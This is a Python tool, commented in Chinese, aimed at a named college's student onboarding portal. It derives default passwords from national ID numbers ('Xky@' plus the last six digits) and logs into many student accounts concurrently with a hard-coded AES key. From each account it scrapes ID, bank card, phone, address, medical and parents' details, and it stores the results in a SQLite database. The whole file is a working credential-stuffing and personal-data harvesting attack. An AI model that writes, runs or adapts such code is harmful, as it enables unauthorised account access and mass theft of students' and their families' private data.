import os
import re
import json
import time
import glob
import base64
import asyncio
import sqlite3
from datetime import datetime

import aiohttp
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

# 全局配置
FIELDS = [
    "身份证号", "姓名", "性别", "入学年份", "籍贯", "专业名称", "班级名称", "宿舍号",
    "手机号", "银行卡号", "家庭住址", "邮政编码", "户籍所在地",
    "父亲姓名", "父亲身份证", "父亲电话", "母亲姓名", "母亲身份证", "母亲电话",
    "毕业中学", "教育经历学历", "就读开始日期", "就读结束日期"
]

DB_FILE = "student_db.db"

ID_CARD_RE = re.compile(r"^\d{17}[\dXx]$")

# 文件名默认配置
# 目录下按命名规则（*账密.txt / *详细信息.txt / *失败账号.txt）自动匹配不到文件时，才会用这里的文件
DEFAULT_ID_LIST_FILE = "示例.txt"    # 改这：功能一要处理的身份证号列表文件
DEFAULT_CRED_FILE = None             # 功能二账密文件，不用可留 None
DEFAULT_INFO_FILE = None             # 功能三详细信息文件，不用可留 None
DEFAULT_FAIL_FILE = None             # 功能四失败账号文件，不用可留 None


def resolve_file(glob_pattern: str, default_file: str | None, step_desc: str) -> str | None:
    # 依次尝试：
    # 目录下按命名规则匹配到文件 —— 只有一个就直接用；有多个列出来自己选（回车默认用最新的）
    # 默认文件
    
    candidates = glob.glob(glob_pattern)

    if candidates:
        candidates.sort(key=os.path.getmtime, reverse=True)

        if len(candidates) == 1:
            print(f"自动找到{step_desc}文件：{candidates[0]}")
            return candidates[0]

        print(f"目录下找到 {len(candidates)} 个匹配的{step_desc}文件：")
        for i, path in enumerate(candidates, 1):
            mtime = datetime.fromtimestamp(os.path.getmtime(path)).strftime("%Y-%m-%d %H:%M")
            print(f"  [{i}] {path}（修改于 {mtime}）")

        try:
            choice = input(f"请选择编号（回车默认选 [1] 最新的）: ").strip()
        except (KeyboardInterrupt, EOFError):
            choice = ""

        if choice.isdigit() and 1 <= int(choice) <= len(candidates):
            return candidates[int(choice) - 1]

        print(f"使用最新的：{candidates[0]}")
        return candidates[0]

    if default_file and os.path.exists(default_file):
        print(f"未匹配到{step_desc}文件，使用代码中写死的默认文件：{default_file}")
        return default_file

    return None


# 功能一：批量生成账密
def validate_and_generate(id_card: str) -> str | None:
    id_card = id_card.strip()

    if not id_card or id_card.startswith("#"):
        return None

    if len(id_card) != 18 or not id_card[:17].isdigit() or not (id_card[-1].isdigit() or id_card[-1] == 'X'):
        print(f"无效身份证：{id_card}，跳过")
        return None

    return f"{id_card},Xky@{id_card[-6:]}"


def batch_generate_credentials(input_file: str | None = None) -> str | None:
    print("\n=== 批量生成账密 ===")

    input_file = input_file or DEFAULT_ID_LIST_FILE

    if not os.path.exists(input_file):
        print(f"当前目录未找到 {input_file}！请修改代码顶部的 DEFAULT_ID_LIST_FILE")
        return None

    name, _ = os.path.splitext(input_file)
    output_file = f"{name}账密.txt"

    results = []
    with open(input_file, "r", encoding="utf-8") as f:
        for line in f:
            if res := validate_and_generate(line):
                results.append(res)

    if not results:
        print("无有效身份证")
        return None

    with open(output_file, "w", encoding="utf-8") as f:
        f.write("身份证号,生成密码\n")
        f.write("\n".join(results))

    print(f"已保存：{output_file}（共 {len(results)} 条）")
    return output_file


# 功能二：批量获取信息
AES_KEY = "UH1eN7apoK9lY5VB"
AES_IV = "VkRu0s6hLfFriZDW"

INFO_URLS = {
    "login": "https://xhkjzyxy.edu.cn:18088/yx/app/sys/login/login",
    "base_info": "https://xhkjzyxy.edu.cn:18088/yx/student/studentInfo",
    "extend_info": "https://xhkjzyxy.edu.cn:18088/yx/student/studentInfoExtend/baseInfo",
    "family": "https://xhkjzyxy.edu.cn:18088/yx/student/familyMember/list",
    "edu": "https://xhkjzyxy.edu.cn:18088/yx/student/eduhistory/list"
}

INFO_MAX_WORKERS = 10
INFO_RETRY_TIMES = 2
INFO_REQ_TIMEOUT = 8
INFO_REQ_DELAY = 0.10

INFO_HEADERS = {
    'Accept': '*/*',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'Connection': 'keep-alive',
    'Referer': 'https://xhkjzyxy.edu.cn:18088/h5/yingxin/student/',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
}

FIELD_TRANSLATION = {
    "id": "学生编号", "name": "姓名", "idCard": "身份证号", "gender": "性别",
    "enrollAnnual": "入学年份", "politicsStatusName": "政治面貌", "nativePlace": "籍贯",
    "middleSchoolName": "毕业中学", "examType": "考试类型", "examTypeName": "考试类型名称",
    "nation": "民族", "educationLevel": "学历", "lengthOfSchooling": "学制",
    "departmentName": "院系名称", "majorId": "专业ID", "majorName": "专业名称",
    "eduMajorName": "教育专业名称", "className": "班级名称", "hobbies": "爱好",
    "ideal": "理想", "remarks": "备注", "avatar": "头像", "mobilePhone": "手机号",
    "bankCard": "银行卡号", "domicilePlace": "户籍所在地", "homeAddress": "家庭住址",
    "leaveArmyStatus": "退伍状态", "wechat": "微信号", "email": "邮箱",
    "microblog": "微博", "faith": "信仰", "healthStatus": "健康状况",
    "medicalHistory": "病史", "domicileType": "户籍类型", "birthplace": "出生地",
    "filingStatus": "建档状态", "filingType": "建档类型", "financialSituation": "家庭经济状况",
    "postalCode": "邮政编码", "applyLoanStatus": "贷款申请状态", "checkInStatus": "报到状态",
    "checkInDate": "报到日期", "roomNo": "宿舍号", "studentInitStatus": "学生初始化状态",
    "province": "省份", "city": "城市", "relationId": "关系ID", "occupation": "职业",
    "workOrganization": "工作单位", "phone": "联系电话", "idCardType": "证件类型",
    "createDate": "创建日期", "updateDate": "更新日期", "status": "状态",
    "schoolName": "学校名称", "degree": "学历", "startDate": "开始日期",
    "endDate": "结束日期", "createTime": "创建时间", "createBy": "创建人",
    "updateTime": "更新时间", "updateBy": "更新人", "studentId": "学生ID"
}

VALUE_TRANSLATION = {
    "gender": {0: "女", 1: "男"},
    "examType": {1: "单招"},
    "leaveArmyStatus": {0: "非退伍", 1: "退伍"},
    "applyLoanStatus": {0: "未申请", 1: "已申请"},
    "checkInStatus": {1: "已报到"},
    "studentInitStatus": {1: "已初始化"},
    "filingStatus": {0: "未建档"},
    "filingType": {1: "类型1"},
    "idCardType": {1: "身份证"},
    "relationId": {1: "父亲", 2: "母亲", 3: "其他"},
    "status": {1: "有效", 0: "无效"}
}


class LoginError(Exception):
    """登录业务错误"""
    pass


def aes_cbc_encrypt(plain_text: str) -> str:
    key_bytes = AES_KEY.encode('utf-8')
    iv_bytes = AES_IV.encode('utf-8')
    cipher = AES.new(key_bytes, AES.MODE_CBC, iv_bytes)
    padded_data = pad(plain_text.encode('utf-8'), AES.block_size, style='pkcs7')
    return base64.b64encode(cipher.encrypt(padded_data)).decode('utf-8')


def format_value(value):
    if value is None:
        return "无"
    if isinstance(value, (dict, list)):
        return json.dumps(value, ensure_ascii=False, indent=2)
    return str(value)


def translate_value(field_name, value):
    if field_name == "homeAddress" and isinstance(value, str):
        value = value.replace("/", "")
        value = re.sub(r'^((?:.+?省)?(?:.+?市)?(?:.+?区|.+?县)?)\1', r'\1', value)
        return value
    if field_name in VALUE_TRANSLATION and value in VALUE_TRANSLATION[field_name]:
        return VALUE_TRANSLATION[field_name][value]
    return "无" if value is None else str(value)


def translate_dict(data, field_context=None):
    if isinstance(data, dict):
        res = {}
        for k, v in data.items():
            new_k = FIELD_TRANSLATION.get(k, k)
            if isinstance(v, (dict, list)):
                res[new_k] = translate_dict(v, k)
            else:
                res[new_k] = translate_value(k, v)
        return res
    elif isinstance(data, list):
        return [
            translate_dict(item, field_context) if isinstance(item, dict)
            else translate_value(field_context, item)
            for item in data
        ]
    return data


def read_accounts(account_file):
    accounts = []
    seen = set()
    skipped_header = False

    with open(account_file, 'r', encoding='utf-8') as f:
        for num, line in enumerate(f, 1):
            line = line.strip()
            if not line or line.startswith('#'):
                continue

            parts = line.split(',') if ',' in line else line.split()
            if len(parts) != 2:
                print(f" 第{num}行格式错误，跳过")
                continue

            acc, pwd = parts[0].strip(), parts[1].split('#')[0].strip()

            # 跳过表头行（如 "身份证号,生成密码"）
            if not ID_CARD_RE.match(acc):
                if not skipped_header:
                    print(f" 第{num}行不是有效身份证号（{acc}），已跳过（可能是表头）")
                    skipped_header = True
                else:
                    print(f" 第{num}行不是有效身份证号（{acc}），跳过")
                continue

            if acc not in seen:
                seen.add(acc)
                accounts.append((acc, pwd))

    if not accounts:
        raise ValueError("未读取到有效账号")

    print(f"成功读取 {len(accounts)} 个账号密码")
    return accounts


async def info_fetch(session, url, method="GET", **kwargs):
    for retry in range(INFO_RETRY_TIMES + 1):
        try:
            async with session.request(method, url, timeout=INFO_REQ_TIMEOUT, **kwargs) as resp:
                resp.raise_for_status()
                try:
                    return await resp.json()
                except json.JSONDecodeError:
                    text = await resp.text()
                    raise RuntimeError(f"接口返回非JSON: {text[:150]}")
                finally:
                    await asyncio.sleep(INFO_REQ_DELAY)

        except (asyncio.TimeoutError, aiohttp.ClientConnectionError, aiohttp.ServerTimeoutError):
            if retry >= INFO_RETRY_TIMES:
                raise
            await asyncio.sleep(0.3)

        except aiohttp.ClientResponseError as e:
            if 500 <= e.status < 600 and retry < INFO_RETRY_TIMES:
                await asyncio.sleep(0.3)
            else:
                raise


async def process_account(session, account):
    id_card, pwd = account
    try:
        login_data = {
            'accoutName': id_card,
            'password': aes_cbc_encrypt(pwd),
            'loginType': 'Student',
        }
        login_res = await info_fetch(session, INFO_URLS["login"], "POST", json=login_data)

        if not login_res.get('success') or login_res.get('errorCode') != 200:
            raise LoginError(f"登录失败: {login_res.get('message', '未知错误')}")

        token = login_res['data'].get('token')
        real_name = login_res['data'].get('info', {}).get('realName', '未知')
        if not token:
            raise LoginError("未获取到Token")

        headers = INFO_HEADERS.copy()
        headers['YingXinToken'] = token

        tasks = [
            info_fetch(session, INFO_URLS["base_info"], headers=headers),
            info_fetch(session, INFO_URLS["extend_info"], headers=headers),
            info_fetch(session, INFO_URLS["family"], headers=headers, params={"page": 1, "limit": 10}),
            info_fetch(session, INFO_URLS["edu"], headers=headers, params={"page": 1, "limit": 10})
        ]
        base_res, extend_res, family_res, edu_res = await asyncio.gather(*tasks)

        info = {
            "身份证号": id_card,
            "姓名": real_name,
            "获取时间": time.strftime("%Y-%m-%d %H:%M:%S"),
            "基础信息": translate_dict(base_res.get('data', {})),
            "扩展信息": translate_dict(extend_res.get('data', {})),
            "家庭成员": translate_dict(family_res.get('data', {})),
            "教育经历": translate_dict(edu_res.get('data', {}))
        }
        return True, info, None

    except Exception as e:
        return False, id_card, f"{type(e).__name__}: {str(e)[:100]}"


async def info_batch_run(accounts):
    queue = asyncio.Queue()
    for idx, acc in enumerate(accounts):
        queue.put_nowait((idx, acc))

    indexed_results = []
    total = len(accounts)
    done_count = 0

    async def worker(session):
        nonlocal done_count
        while True:
            try:
                idx, acc = queue.get_nowait()
            except asyncio.QueueEmpty:
                return
            try:
                res = await process_account(session, acc)
                indexed_results.append((idx, res))
            finally:
                done_count += 1
                print(f"  进度: {done_count}/{total}", end="\r", flush=True)
                queue.task_done()

    connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(connector=connector, headers=INFO_HEADERS) as session:
        workers = [asyncio.create_task(worker(session)) for _ in range(INFO_MAX_WORKERS)]
        await asyncio.gather(*workers)

    print()  # 换行，避免覆盖最后一行进度

    indexed_results.sort(key=lambda x: x[0])
    results = [item[1] for item in indexed_results]

    success, fail = [], []
    for res in results:
        if res[0]:
            success.append(res[1])
        else:
            fail.append(f"{res[1]},{res[2]}")
    return success, fail


def format_info_entry(idx: int, info: dict) -> str:
    # 把一条学生信息格式化成详细信息文件里的一个【N】区块
    lines = [f"【{idx}】{info.get('姓名', '未知')}（{info.get('身份证号', '未知')}）\n"]
    for k, v in info.items():
        if k in ("姓名", "身份证号"):
            continue
        lines.append(f"{k}: {format_value(v)}\n")
    lines.append("\n")
    return "".join(lines)


def write_fail_file(fail_file: str, fail_list: list, empty_message: str | None = None) -> None:
    # 写入/清理失败账号文件
    if fail_list:
        with open(fail_file, 'w', encoding='utf-8') as f:
            f.write("身份证号,失败原因\n")
            f.write("\n".join(fail_list))
        print(f"失败账号已保存到: {fail_file}")
    else:
        if os.path.exists(fail_file):
            os.remove(fail_file)
        if empty_message:
            print(empty_message)


def save_info_data(output_file, fail_file, success, fail):
    if success:
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(f"批量处理结果 - 生成时间: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            for idx, info in enumerate(success, 1):
                f.write(format_info_entry(idx, info))
        print(f"成功信息已保存到: {output_file}")

    write_fail_file(fail_file, fail)


def append_info_data(target_file: str, success: list) -> None:
    # 把重试成功的记录追加到已有详细信息文件末尾，续编号，不覆盖原有内容 
    if not success:
        return

    start_idx = 1
    if os.path.exists(target_file):
        with open(target_file, encoding='utf-8') as f:
            start_idx = len(re.findall(r"【\d+】", f.read())) + 1
    else:
        with open(target_file, 'w', encoding='utf-8') as f:
            f.write(f"批量处理结果 - 生成时间: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")

    with open(target_file, 'a', encoding='utf-8') as f:
        for offset, info in enumerate(success):
            f.write(format_info_entry(start_idx + offset, info))

    print(f"已将 {len(success)} 条补录信息追加到: {target_file}")


def batch_get_info(account_file: str | None = None) -> str | None:
    print("\n=== 批量获取信息（从教务系统接口拉取） ===")

    account_file = account_file or resolve_file("*账密.txt", DEFAULT_CRED_FILE, "账密")

    if not account_file:
        print("未找到账密文件（自动匹配和 DEFAULT_CRED_FILE 都没有），终止")
        return None

    if not os.path.exists(account_file):
        print(f"当前目录未找到 {account_file}！")
        return None

    base = account_file.rsplit('.', 1)[0]
    output_file = f"{base}详细信息.txt"
    fail_file = f"{base}失败账号.txt"

    try:
        accounts = read_accounts(account_file)
    except ValueError as e:
        print(e)
        return None

    start = time.time()
    success_list, fail_list = asyncio.run(info_batch_run(accounts))
    end = time.time()

    total = len(accounts)
    success_cnt = len(success_list)
    fail_cnt = len(fail_list)
    rate = (success_cnt / total * 100) if total > 0 else 0.00

    print()
    print("统计结果:")
    print(f"总账号数: {total}")
    print(f"成功数: {success_cnt}")
    print(f"失败数: {fail_cnt}")
    print(f"成功率: {rate:.2f}%")
    print(f"总耗时: {end - start:.2f} 秒")

    save_info_data(output_file, fail_file, success_list, fail_list)

    return output_file if success_list else None


def retry_failed_accounts():
    print("\n=== 重试失败账号 ===")

    fail_file = resolve_file("*失败账号.txt", DEFAULT_FAIL_FILE, "失败账号")

    if not fail_file or not os.path.exists(fail_file):
        print("没有找到失败账号文件，终止")
        return

    ids = []
    with open(fail_file, encoding='utf-8') as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            id_card = line.split(',')[0].strip()
            if ID_CARD_RE.match(id_card):
                ids.append(id_card)

    if not ids:
        print("失败账号文件中没有有效身份证号")
        return

    # 密码是按身份证号后6位固定生成的，可以直接重新推算，不用依赖账密文件
    accounts = [(i, f"Xky@{i[-6:]}") for i in ids]
    print(f"共 {len(accounts)} 个失败账号，重新尝试中...")

    success_list, fail_list = asyncio.run(info_batch_run(accounts))

    print()
    print(f"重试结果：成功 {len(success_list)} 个，仍失败 {len(fail_list)} 个")

    # 优先追加进已知的详细信息文件，找不到就新建一份
    target_info_file = (
        resolve_file("*详细信息.txt", DEFAULT_INFO_FILE, "详细信息")
        or fail_file.replace("失败账号.txt", "详细信息.txt")
    )
    append_info_data(target_info_file, success_list)

    if fail_list:
        write_fail_file(fail_file, fail_list)
        print(f"仍失败的账号已更新到: {fail_file}")
    else:
        write_fail_file(fail_file, fail_list, empty_message="全部重试成功，已清除失败账号文件")


# 功能三：导入数据库
def clean_id(value):
    value = re.sub(r"[^\dXx]", "", str(value or ""))
    return value.upper() if len(value) == 18 else ""


def extract_json(text, key):
    # 提取指定标签后的完整 JSON，支持嵌套 {} / []
    pos = text.find(key)
    if pos < 0:
        return None

    starts = [p for p in (text.find("{", pos), text.find("[", pos)) if p >= 0]
    if not starts:
        return None

    start = min(starts)
    pairs = {"{": "}", "[": "]"}
    stack = []
    quote = escape = False

    for i in range(start, len(text)):
        c = text[i]

        if quote:
            if escape:
                escape = False
            elif c == "\\":
                escape = True
            elif c == '"':
                quote = False
            continue

        if c == '"':
            quote = True
        elif c in pairs:
            stack.append(pairs[c])
        elif stack and c == stack[-1]:
            stack.pop()
            if not stack:
                return json.loads(text[start:i + 1])

    return None


def parse_student(text):
    # 用字段名赋值
    row = {f: "" for f in FIELDS}

    base = extract_json(text, "基础信息:")
    ext = extract_json(text, "扩展信息:")
    family = extract_json(text, "家庭成员:")
    education = extract_json(text, "教育经历:")

    id_match = re.search(r"身份证号[:：\s]*([^\n]{18,30})", text)
    if id_match:
        row["身份证号"] = clean_id(id_match.group(1))

    name_match = re.search(r"姓名[:：\s]*([^\n]+)", text)
    if name_match:
        row["姓名"] = name_match.group(1).strip()

    if base:
        row["性别"] = base.get("性别", "")
        row["入学年份"] = base.get("入学年份", "")
        row["籍贯"] = base.get("籍贯", "")
        row["专业名称"] = base.get("专业名称", "")
        row["班级名称"] = base.get("班级名称", "").strip()
        row["宿舍号"] = base.get("studentExtendInfoVO", {}).get("宿舍号", "")
        row["毕业中学"] = base.get("毕业中学", "")

        # JSON 里的身份证/姓名更可靠时覆盖正则抓到的
        row["身份证号"] = clean_id(base.get("身份证号")) or row["身份证号"]
        row["姓名"] = base.get("姓名", "") or row["姓名"]

    if ext:
        row["手机号"] = ext.get("手机号", "")
        row["银行卡号"] = ext.get("银行卡号", "")
        row["家庭住址"] = ext.get("家庭住址", "")
        row["邮政编码"] = ext.get("邮政编码", "")
        row["户籍所在地"] = ext.get("户籍所在地", "")

    if isinstance(family, list):
        for person in family:
            relation = person.get("关系ID")
            if relation == "父亲":
                row["父亲姓名"] = person.get("姓名", "")
                row["父亲身份证"] = clean_id(person.get("身份证号"))
                row["父亲电话"] = person.get("联系电话", "")
            elif relation == "母亲":
                row["母亲姓名"] = person.get("姓名", "")
                row["母亲身份证"] = clean_id(person.get("身份证号"))
                row["母亲电话"] = person.get("联系电话", "")

    if isinstance(education, list) and education:
        edu = education[0]
        row["教育经历学历"] = edu.get("学历", "")
        row["就读开始日期"] = edu.get("开始日期", "")
        row["就读结束日期"] = edu.get("结束日期", "")

    return [row[f] for f in FIELDS]


def read_text(txt_file):
    for encoding in ("utf-8", "gbk"):
        try:
            with open(txt_file, encoding=encoding) as f:
                return f.read()
        except UnicodeDecodeError:
            continue

    raise UnicodeDecodeError("unknown", b"", 0, 1, "无法识别文件编码")


def import_to_database(txt_file: str | None = None):
    print("\n=== 导入数据库 ===")

    txt_file = txt_file or resolve_file("*详细信息.txt", DEFAULT_INFO_FILE, "详细信息")

    if not txt_file:
        print("未找到详细信息文件（自动匹配和 DEFAULT_INFO_FILE 都没有），终止")
        return

    try:
        text = read_text(txt_file)
    except FileNotFoundError:
        print(f"未找到文件：{txt_file}")
        return
    except UnicodeDecodeError as e:
        print(e)
        return

    blocks = [
        x for x in re.split(r"(?=【\d+】)", text)
        if "身份证号" in x
    ]

    students = []
    seen = set()

    for block in blocks:
        try:
            data = parse_student(block)
        except (json.JSONDecodeError, TypeError, ValueError):
            continue

        sid = data[0]
        if len(sid) == 18 and sid not in seen:
            students.append(data)
            seen.add(sid)

    if not students:
        print("没有解析到有效学生数据")
        return

    students.sort(key=lambda x: (
        x[6].strip() or "ZZZZZZ",
        x[1].strip() or "ZZZZZZ"
    ))

    class_count = {}
    for student in students:
        cls = student[6] or "未分配班级"
        class_count[cls] = class_count.get(cls, 0) + 1

    print(f"解析有效数据：{len(students)} 条")
    print(f"班级数量：{len(class_count)}")
    for cls, count in sorted(class_count.items()):
        print(f"{cls}：{count} 人")

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()

    columns = ", ".join(f"`{f}` TEXT" for f in FIELDS)
    names = ", ".join(f"`{f}`" for f in FIELDS)
    values = ", ".join("?" for _ in FIELDS)

    try:
        cursor.execute(f"""
            CREATE TABLE IF NOT EXISTS students (
                {columns},
                PRIMARY KEY (`身份证号`)
            )
        """)

        rows = [
            [None if value == "" else value for value in student]
            for student in students
        ]

        cursor.executemany(
            f"""
            INSERT OR REPLACE INTO students ({names})
            VALUES ({values})
            """,
            rows
        )
        conn.commit()

    except sqlite3.Error as e:
        conn.rollback()
        print(f"数据库操作失败：{e}")
        conn.close()
        return

    total = cursor.execute("SELECT COUNT(*) FROM students").fetchone()[0]
    x_count = cursor.execute(
        "SELECT COUNT(*) FROM students WHERE 身份证号 LIKE '%X'"
    ).fetchone()[0]

    print(f"\n批量入库：{len(rows)} 条")
    print(f"数据库总记录：{total} 条")
    print(f"X 结尾身份证：{x_count} 条")

    preview = cursor.execute("""
        SELECT 姓名, 身份证号, 班级名称, 专业名称
        FROM students
        LIMIT 10
    """).fetchall()

    print("\n前10条数据：")
    for i, row in enumerate(preview, 1):
        print(
            f"{i}. {row[0] or '【无】'} | "
            f"{row[1] or '【无】'} | "
            f"{row[2] or '【无】'} | "
            f"{row[3] or '【无】'}"
        )

    conn.close()
    print("\n处理完成")


# 主菜单
def main():
    while True:
        print()
        print("  [1] 批量生成账密")
        print("  [2] 批量获取信息")
        print("  [3] 导入数据库")
        print("  [4] 重试失败账号")
        print("  [0] 退出")

        try:
            choice = input("  请选择: ").strip()
        except (KeyboardInterrupt, EOFError):
            print("\n")
            break

        if choice == "1":
            batch_generate_credentials()
        elif choice == "2":
            batch_get_info()
        elif choice == "3":
            import_to_database()
        elif choice == "4":
            retry_failed_accounts()
        elif choice == "0":
            print("退出系统")
            break
        else:
            print("无效选项，请重新输入")


if __name__ == "__main__":
    main()
